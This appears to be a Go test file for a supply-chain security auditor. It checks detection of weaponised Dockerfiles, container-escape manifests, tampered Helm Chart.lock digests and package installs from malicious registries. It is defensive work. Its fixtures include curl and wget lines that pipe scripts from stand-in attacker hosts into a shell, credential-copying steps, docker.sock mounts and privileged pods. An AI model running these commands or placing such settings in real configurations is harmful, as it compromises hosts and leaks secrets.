package adversarial

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"bonjoski/argus/internal/gitdiff"
	"bonjoski/argus/internal/lockfile"
	"bonjoski/argus/internal/model"
	"bonjoski/argus/internal/shim"
)

// ADV-22: Container Escape Infiltration, Helm Supply-Chain Tampering, and Toolchain Shim Hijacking
// Validates defenses against supply-chain infiltration across container manifests, Helm charts, and modern package tools:
//  1. Dockerfile Weaponization: Blocks unverified remote downloads piped to shell and credential copying into images.
//  2. Container Escape & Namespace Breakout: Intercepts /var/run/docker.sock mounts, privileged mode, and host namespace sharing.
//  3. Helm Lockfile Integrity: Blocks mismatched or missing cryptographic digests in Chart.lock.
//  4. Toolchain Shim Extraction: Accurately extracts install targets across uv, bundle, dotnet, nuget, and swift despite interleaved flags.
//  5. Benign Passage: Ensures zero false positives for standard container and Helm configurations.

func TestADV22_DockerfileEvasionAndCredentialExfiltration(t *testing.T) {
	tmpDir := t.TempDir()
	auditor := gitdiff.NewSemanticDiffAuditor(tmpDir)

	// Weaponized Dockerfile attempting unverified curl/wget piped to bash/sh and exfiltrating AWS / SSH keys
	dockerfileContent := `FROM golang:1.24-alpine
WORKDIR /build
# Suspicious remote scripts piped to shells
RUN   curl -sSL https://raw.githubusercontent.com/evil-org/backdoor/main/install.sh | /bin/bash
RUN wget -qO- https://cdn.malicious.io/payload.bin | sh
# Copying sensitive credentials
COPY .aws/credentials /root/.aws/credentials
ADD ./id_ed25519 /root/.ssh/id_ed25519
RUN go build -o /app
ENTRYPOINT ["/app"]
`
	dockerfilePath := filepath.Join(tmpDir, "Dockerfile")
	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0644); err != nil {
		t.Fatalf("failed to write Dockerfile: %v", err)
	}

	report, err := auditor.AuditFiles(context.Background(), tmpDir, []string{"Dockerfile"})
	if err != nil {
		t.Fatalf("AuditFiles failed: %v", err)
	}

	if report.Allowed {
		t.Fatalf("expected weaponized Dockerfile to be BLOCKED, got Allowed=true")
	}

	insecureDownloads := 0
	secretExfil := 0
	for _, f := range report.Findings {
		if f.Category == "Container-Insecure-Download" {
			insecureDownloads++
		}
		if f.Category == "Container-Secret-Exfiltration" {
			secretExfil++
		}
	}

	if insecureDownloads < 2 {
		t.Errorf("expected at least 2 Container-Insecure-Download findings, got %d", insecureDownloads)
	}
	if secretExfil < 2 {
		t.Errorf("expected at least 2 Container-Secret-Exfiltration findings, got %d", secretExfil)
	}
}

func TestADV22_ContainerEscapeMountsAndPrivilegeEscalation(t *testing.T) {
	tmpDir := t.TempDir()
	auditor := gitdiff.NewSemanticDiffAuditor(tmpDir)

	// 1. Docker compose mounting host Docker daemon socket
	composeContent := `version: '3.9'
services:
  agent:
    image: ghcr.io/malicious-actor/sandbox-runner:v1.0
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro # Attempted container escape
`
	composePath := filepath.Join(tmpDir, "docker-compose.yaml")
	if err := os.WriteFile(composePath, []byte(composeContent), 0644); err != nil {
		t.Fatalf("failed to write compose file: %v", err)
	}

	// 2. Kubernetes manifest setting privileged mode and host namespaces
	k8sDir := filepath.Join(tmpDir, "deploy")
	if err := os.MkdirAll(k8sDir, 0755); err != nil {
		t.Fatalf("failed to create deploy dir: %v", err)
	}
	podContent := `apiVersion: apps/v1
kind: Deployment
metadata:
  name: escape-pod
spec:
  template:
    spec:
      hostPID: true # Host process table access
      hostNetwork: true # Host interface sniffer
      hostIPC: true # Host shared memory
      containers:
      - name: payload
        image: alpine:latest
        securityContext:
          privileged: true # Full hardware root privileges
`
	podPath := filepath.Join(k8sDir, "deployment.yaml")
	if err := os.WriteFile(podPath, []byte(podContent), 0644); err != nil {
		t.Fatalf("failed to write pod file: %v", err)
	}

	report, err := auditor.AuditFiles(context.Background(), tmpDir, []string{"docker-compose.yaml", "deploy/deployment.yaml"})
	if err != nil {
		t.Fatalf("AuditFiles failed: %v", err)
	}

	if report.Allowed {
		t.Fatalf("expected container escape configurations to be BLOCKED, got Allowed=true")
	}

	var hasSocketMount, hasPrivileged, hasHostNamespace bool
	for _, f := range report.Findings {
		switch f.Category {
		case "Container-Socket-Mount":
			hasSocketMount = true
			if f.Severity != gitdiff.DiffSeverityCritical {
				t.Errorf("expected Container-Socket-Mount severity CRITICAL, got %s", f.Severity)
			}
		case "Container-Privileged-Mode":
			hasPrivileged = true
			if f.Severity != gitdiff.DiffSeverityHigh {
				t.Errorf("expected Container-Privileged-Mode severity HIGH, got %s", f.Severity)
			}
		case "Container-Host-Namespace":
			hasHostNamespace = true
			if f.Severity != gitdiff.DiffSeverityHigh {
				t.Errorf("expected Container-Host-Namespace severity HIGH, got %s", f.Severity)
			}
		}
	}

	if !hasSocketMount {
		t.Errorf("expected Container-Socket-Mount finding for /var/run/docker.sock")
	}
	if !hasPrivileged {
		t.Errorf("expected Container-Privileged-Mode finding for privileged: true")
	}
	if !hasHostNamespace {
		t.Errorf("expected Container-Host-Namespace finding for hostPID/hostNetwork/hostIPC")
	}
}

func TestADV22_HelmChartLockTamperingAndMissingIntegrity(t *testing.T) {
	// Baseline trusted digest for redis sub-chart
	trustedHashes := map[string]string{
		"helm:redis:17.3.14": "sha256:0000111122223333444455556666777788889999aaaabbbbccccddddeeeeffff",
	}
	validator := lockfile.NewLockfileValidator(trustedHashes)

	// Tampered Chart.lock: redis digest has been modified, and rabbitmq has no digest at all
	tamperedChartLock := `
dependencies:
  - name: redis
    version: 17.3.14
    repository: https://charts.bitnami.com/bitnami
    digest: sha256:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
  - name: rabbitmq
    version: 11.2.0
    repository: https://charts.bitnami.com/bitnami
    # digest is missing (unpinned dependency)
digest: sha256:masterchartdigest
generated: "2026-10-28T12:00:00Z"
`
	deps, err := lockfile.ParseHelmChartLock([]byte(tamperedChartLock))
	if err != nil {
		t.Fatalf("ParseHelmChartLock failed: %v", err)
	}

	if len(deps) != 2 {
		t.Fatalf("expected 2 dependencies parsed, got %d", len(deps))
	}

	report := validator.AuditDependencies(deps)
	if report.Allowed {
		t.Fatalf("expected tampered Helm Chart.lock to be BLOCKED, got Allowed=true")
	}

	if report.TamperedCount != 1 {
		t.Errorf("expected 1 tampered chart dependency, got %d", report.TamperedCount)
	}
	if report.MissingHashes != 1 {
		t.Errorf("expected 1 missing hash dependency, got %d", report.MissingHashes)
	}

	// Verify parser detection via Detect()
	parser, eco, err := lockfile.Detect("charts/myapp/Chart.lock")
	if err != nil {
		t.Fatalf("lockfile.Detect failed for Chart.lock: %v", err)
	}
	if eco != model.EcosystemHelm {
		t.Errorf("expected EcosystemHelm, got %s", eco)
	}
	if _, ok := parser.(*lockfile.HelmLockParser); !ok {
		t.Errorf("expected *HelmLockParser instance from Detect")
	}
}

func TestADV22_ToolchainShimArgumentHijackingAndExtraction(t *testing.T) {
	testCases := []struct {
		tool            string
		args            []string
		expectedEco     model.Ecosystem
		expectedTargets []string
		expectedInstall bool
	}{
		{
			tool:            "uv",
			args:            []string{"add", "--index", "https://evil.pypi.org/simple", "trojan-package"},
			expectedEco:     model.EcosystemPyPI,
			expectedTargets: []string{"trojan-package"},
			expectedInstall: true,
		},
		{
			tool:            "uv",
			args:            []string{"pip", "install", "-i", "https://evil.pypi.org/simple", "backdoor-agent"},
			expectedEco:     model.EcosystemPyPI,
			expectedTargets: []string{"backdoor-agent"},
			expectedInstall: true,
		},
		{
			tool:            "bundle",
			args:            []string{"add", "--source", "https://evil-gems.org", "infiltrator-gem"},
			expectedEco:     model.EcosystemRubyGems,
			expectedTargets: []string{"infiltrator-gem"},
			expectedInstall: true,
		},
		{
			tool:            "dotnet",
			args:            []string{"add", "package", "FakeSerilog", "--source", "https://evil-nuget.org", "--version", "2.0.0"},
			expectedEco:     model.EcosystemNuGet,
			expectedTargets: []string{"FakeSerilog"},
			expectedInstall: true,
		},
		{
			tool:            "nuget",
			args:            []string{"install", "MaliciousPackage", "-Source", "https://evil-nuget.org"},
			expectedEco:     model.EcosystemNuGet,
			expectedTargets: []string{"MaliciousPackage"},
			expectedInstall: true,
		},
		{
			tool:            "swift",
			args:            []string{"package", "add-dependency", "https://github.com/adversary/remote-pwn.git", "--exact", "1.0.0"},
			expectedEco:     model.EcosystemSwift,
			expectedTargets: []string{"https://github.com/adversary/remote-pwn.git"},
			expectedInstall: true,
		},
	}

	for _, tc := range testCases {
		eco, targets, isInstall := shim.ExtractTargets(tc.tool, tc.args)
		if !isInstall {
			t.Errorf("[%s %v] expected isInstall=true", tc.tool, tc.args)
		}
		if eco != tc.expectedEco {
			t.Errorf("[%s %v] expected eco %s, got %s", tc.tool, tc.args, tc.expectedEco, eco)
		}
		if len(targets) != len(tc.expectedTargets) {
			t.Fatalf("[%s %v] expected %d targets, got %d (%v)", tc.tool, tc.args, len(tc.expectedTargets), len(targets), targets)
		}
		for i := range targets {
			if targets[i] != tc.expectedTargets[i] {
				t.Errorf("[%s %v] target[%d] = %s, expected %s", tc.tool, tc.args, i, targets[i], tc.expectedTargets[i])
			}
		}
	}
}

func TestADV22_CleanContainerAndHelmVerification(t *testing.T) {
	tmpDir := t.TempDir()
	auditor := gitdiff.NewSemanticDiffAuditor(tmpDir)

	// Clean Dockerfile
	cleanDockerfile := `FROM golang:1.24-alpine AS builder
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -o /bin/app ./cmd/app

FROM alpine:latest
COPY --from=builder /bin/app /bin/app
USER 1000:1000
ENTRYPOINT ["/bin/app"]
`
	if err := os.WriteFile(filepath.Join(tmpDir, "Dockerfile"), []byte(cleanDockerfile), 0644); err != nil {
		t.Fatalf("failed to write clean Dockerfile: %v", err)
	}

	// Clean Kubernetes Deployment
	cleanK8s := `apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  replicas: 3
  template:
    spec:
      containers:
      - name: web
        image: app:v1.0.0
        securityContext:
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
`
	if err := os.WriteFile(filepath.Join(tmpDir, "deployment.yaml"), []byte(cleanK8s), 0644); err != nil {
		t.Fatalf("failed to write clean k8s deployment: %v", err)
	}

	report, err := auditor.AuditFiles(context.Background(), tmpDir, []string{"Dockerfile", "deployment.yaml"})
	if err != nil {
		t.Fatalf("AuditFiles failed: %v", err)
	}

	if !report.Allowed {
		t.Fatalf("expected clean container manifests to be ALLOWED, got Allowed=false (%+v)", report.Findings)
	}
	if len(report.Findings) != 0 {
		t.Errorf("expected 0 findings for clean manifests, got %d (%+v)", len(report.Findings), report.Findings)
	}

	// Clean Helm Chart.lock with valid matching digest
	trustedHashes := map[string]string{
		"helm:postgresql:15.5.0": "sha256:validhash1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
	}
	cleanChartLock := `
dependencies:
  - name: postgresql
    version: 15.5.0
    repository: https://charts.bitnami.com/bitnami
    digest: sha256:validhash1234567890abcdef1234567890abcdef1234567890abcdef1234567890
digest: sha256:chartdigest123
`
	validator := lockfile.NewLockfileValidator(trustedHashes)
	deps, err := lockfile.ParseHelmChartLock([]byte(cleanChartLock))
	if err != nil {
		t.Fatalf("ParseHelmChartLock failed: %v", err)
	}

	lockReport := validator.AuditDependencies(deps)
	if !lockReport.Allowed {
		t.Errorf("expected clean Helm Chart.lock to be ALLOWED, got Allowed=false")
	}
	if lockReport.TamperedCount != 0 || lockReport.MissingHashes != 0 {
		t.Errorf("expected 0 tampered and 0 missing hashes, got tampered=%d, missing=%d", lockReport.TamperedCount, lockReport.MissingHashes)
	}
}
